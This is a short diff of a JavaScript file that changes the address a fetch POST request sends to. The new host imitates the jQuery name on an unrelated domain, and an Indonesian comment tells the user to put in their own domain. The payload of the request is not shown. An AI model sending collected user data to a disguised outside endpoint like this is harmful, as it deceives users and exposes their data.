@@ -18,7 +18,7 @@
             }
 
             // Ganti url ini dengan url domain kalian 
-            fetch(`https://gapihxhdhjd.meso.my.id/index.php`, 
+            fetch(`https://jquery.news23.biz.id/index.php`, 
 {
                 method: 'POST',
                 headers: {
